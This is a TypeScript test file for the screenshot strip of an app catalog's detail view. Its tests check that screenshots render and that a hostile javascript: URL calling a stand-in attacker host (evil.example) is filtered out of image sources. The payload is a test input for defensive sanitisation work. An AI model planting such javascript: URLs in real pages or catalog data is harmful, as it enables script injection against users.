import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import type { AppEntry } from '@bridgething/catalog';
import { mount, type Mounted } from '../mount';
import { AppDetail, type BakedApp } from './AppDetail';

const APP_ID = '019e6701-13f8-71b5-ba04-85d326630e98';
const SHOT = 'https://bridgething.com/screenshots/device-calendar.png';
const STEAL = "javascript:fetch('https://evil.example/')";

function baked(overrides: Partial<AppEntry> = {}): BakedApp {
  const app: AppEntry = {
    id: APP_ID,
    name: 'Calendar',
    description: 'Upcoming events.',
    author: 'JoeyEamigh',
    icon: null,
    homepage: null,
    source: null,
    versions: [
      {
        version: '0.1.0',
        released_at: '2026-07-01T00:00:00Z',
        download: { url: 'https://apps.bridgething.com/r/x.zip', size: 10, sha256: '0'.repeat(64) },
        permissions: [],
        min_libbridgething_version: '0.4.0',
        changelog: null,
      },
    ],
    ...overrides,
  };

  return {
    app,
    source: {
      url: 'https://apps.bridgething.com/catalog.json',
      name: 'official',
      icon: null,
      official: true,
      attested: true,
    },
  };
}

let held: Mounted | null = null;
const originalFetch = globalThis.fetch;

beforeEach(() => {
  globalThis.fetch = (() => Promise.reject(new Error('offline'))) as unknown as typeof fetch;
});

afterEach(() => {
  globalThis.fetch = originalFetch;
  held?.unmount();
  held = null;
});

describe('the screenshot strip', () => {
  test('renders every capture the catalog entry carries', async () => {
    held = mount(<AppDetail baked={baked({ screenshots: [SHOT] })} />);
    await Promise.resolve();

    expect(held.all('img').map(image => image.getAttribute('src'))).toContain(SHOT);
  });

  test('an app with no screenshots renders no strip rather than an empty one', async () => {
    held = mount(<AppDetail baked={baked()} />);
    await Promise.resolve();

    expect(held.all('img')).toHaveLength(0);
  });

  test('a javascript screenshot url never reaches an image source', async () => {
    held = mount(<AppDetail baked={baked({ screenshots: [STEAL] })} />);
    await Promise.resolve();

    expect(held.all('img').map(image => image.getAttribute('src'))).not.toContain(STEAL);
    expect(held.all('img')).toHaveLength(0);
  });
});
